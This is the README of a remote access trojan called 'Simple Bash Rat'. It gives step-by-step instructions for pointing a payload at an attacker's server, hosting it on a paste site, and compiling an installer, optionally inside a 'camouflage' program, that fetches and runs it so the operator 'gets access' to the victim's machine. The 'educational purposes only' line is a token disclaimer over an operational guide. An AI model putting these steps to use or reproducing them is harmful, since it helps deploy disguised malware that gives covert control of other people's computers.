# SBR - Simple Bash Rat

**Use for educational purposes only.**

## Instructions

### Step 1:
Edit `runner.cpp` and replace `<server_domain>` with the server URL, where the `server.py` is running. Make sure you mention the correct port (if not using ngrok). Copy the entire contents of that file and upload to something like hastebin. Copy the raw text URL of it.

### Step 2:
You can either compile `installer.cpp` using `g++` or the JinuxML is a camouflage. Edit `main.cpp` (if JinuxML) or `installer.cpp` and replace `<SCRIPT_URL>` with the URL you copied in step 1.

## Info:

### How to compile:
`mkdir build`
`cd build` 
`cmake ..`
`make`

### Execute:

`./main`


After that, you should be able to get access.

Note: `server.py` is still under work.
